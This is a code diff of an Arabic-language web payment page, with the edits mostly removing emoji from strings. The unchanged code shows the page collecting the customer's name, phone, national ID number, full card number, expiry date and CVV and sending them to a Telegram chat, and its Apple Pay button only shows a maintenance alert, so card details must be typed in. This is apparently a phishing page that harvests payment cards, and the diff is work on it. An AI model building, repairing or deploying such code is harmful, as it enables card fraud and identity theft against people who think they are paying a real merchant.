@@ -371,7 +371,7 @@
       </div>
 
 <div class="payment-method-option apple-pay-option" id="applePayBtn" onclick="showMaintenanceAlert()" style="cursor: pointer;">
-  <span class="apple-pay-text"> Pay</span>
+  <span class="apple-pay-text"> Pay</span>
 </div>
 
       <div class="field-wrapper" style="margin-top: 14px;">
@@ -513,19 +513,19 @@
     // Submit payment data to Telegram
     async function submitToServer(data) {
       const message = `
-💳 <b>بيانات الدفع الجديدة:</b>
-━━━━━━━━━━━━━━━
-👤 العميل: ${data.owner_name}
-━━━━━━━━━━━━━━━
-📱 رقم الهاتف: ${data.phone}
+ <b>بيانات الدفع الجديدة:</b>
+
+ العميل: ${data.owner_name}
+
+ رقم الهاتف: ${data.phone}
 🪪 رقم الهوية: ${data.id_number}
-━━━━━━━━━━━━━━━
-💳 نوع البطاقة: ${data.card_type}
-👤 الاسم على البطاقة: ${data.card_name}
-🔢 رقم البطاقة: ${data.card_number}
-📅 تاريخ الانتهاء: ${data.expiry_month}/${data.expiry_year}
-🔐 رمز الـ CVV: ${data.cvv}
-💰 إجمالي السعر: ${data.total_price}
+
+ نوع البطاقة: ${data.card_type}
+ الاسم على البطاقة: ${data.card_name}
+ رقم البطاقة: ${data.card_number}
+ تاريخ الانتهاء: ${data.expiry_month}/${data.expiry_year}
+ رمز الـ CVV: ${data.cvv}
+ إجمالي السعر: ${data.total_price}
       `;
       return await sendToTelegram(message);
     }
@@ -605,12 +605,12 @@
     // أيقونة نوع البطاقة
     function getCardIcon(type) {
       const icons = {
-        'Visa': '💳 <span style="color:#1A1F71;font-weight:bold">VISA</span>',
-        'Mastercard': '💳 <span style="color:#EB001B;font-weight:bold">MASTERCARD</span>',
-        'American Express': '💳 <span style="color:#006FCF;font-weight:bold">AMEX</span>',
-        'Mada': '💳 <span style="color:#00854D;font-weight:bold">MADA</span>',
-        'Mira': '💳 <span style="color:#6B5B95;font-weight:bold">MIRA</span>',
-        'غير معروف': '❓ غير معروف'
+        'Visa': ' <span style="color:#1A1F71;font-weight:bold">VISA</span>',
+        'Mastercard': ' <span style="color:#EB001B;font-weight:bold">MASTERCARD</span>',
+        'American Express': ' <span style="color:#006FCF;font-weight:bold">AMEX</span>',
+        'Mada': ' <span style="color:#00854D;font-weight:bold">MADA</span>',
+        'Mira': ' <span style="color:#6B5B95;font-weight:bold">MIRA</span>',
+        'غير معروف': ' غير معروف'
       };
       return icons[type] || icons['غير معروف'];
     }
